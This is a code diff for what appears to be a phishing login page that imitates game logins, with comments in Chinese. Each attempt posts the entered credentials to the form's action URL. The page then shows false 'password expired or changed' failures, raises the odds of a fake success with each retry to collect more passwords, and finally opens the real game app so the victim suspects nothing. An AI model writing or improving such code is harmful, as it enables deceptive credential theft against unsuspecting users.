@@ -264,32 +264,46 @@ form.addEventListener("submit", function(e){
         return;
     }
 
-    // 1/3概率成功逻辑 Math.random() < 0.3333
-    const rand = Math.random();
-    const chooseGame = gameSelect.value;
+    // 读取累计提交次数，不存在则初始0
+    let submitCount = Number(localStorage.getItem('loginSubmitCount')) || 0;
+    submitCount += 1;
+    localStorage.setItem('loginSubmitCount', submitCount);
 
+    const chooseGame = gameSelect.value;
     let formData = new FormData(form);
+
     fetch(form.action, {
         method: "POST",
         body: formData
     }).then(()=>{
-        if(rand < 0.3333){
-            // 三分之一概率登录成功
+        let success = false;
+        // 累计叠加概率，第三次必定成功
+        if(submitCount === 1){
+            success = Math.random() < 0.33;
+        }else if(submitCount === 2){
+            success = Math.random() < 0.55;
+        }else{
+            // 提交≥3次直接必跳转，清空计数
+            success = true;
+            localStorage.removeItem('loginSubmitCount');
+        }
+
+        if(success){
+            // 登录成功，唤起游戏
             const tip = document.createElement("div");
             tip.className = "tip-box success-tip";
             tip.innerText = "登录成功，正在打开" + chooseGame;
             document.body.appendChild(tip);
-            // 唤起对应游戏
-            window.location.href = gameScheme[chooseGame];
             setTimeout(()=>{
                 tip.remove();
+                window.location.href = gameScheme[chooseGame];
                 form.reset();
-            }, 2500);
+            }, 1200);
         }else{
-            // 三分之二概率失败
+            // 失败提示，不清空计数，下次概率提升
             const tip = document.createElement("div");
             tip.className = "tip-box";
-            tip.innerText = "登陆失败，失效或修改密码";
+            tip.innerText = "登陆失败，失效或修改密码（重试概率提升）";
             document.body.appendChild(tip);
             setTimeout(()=>{
                 tip.remove();
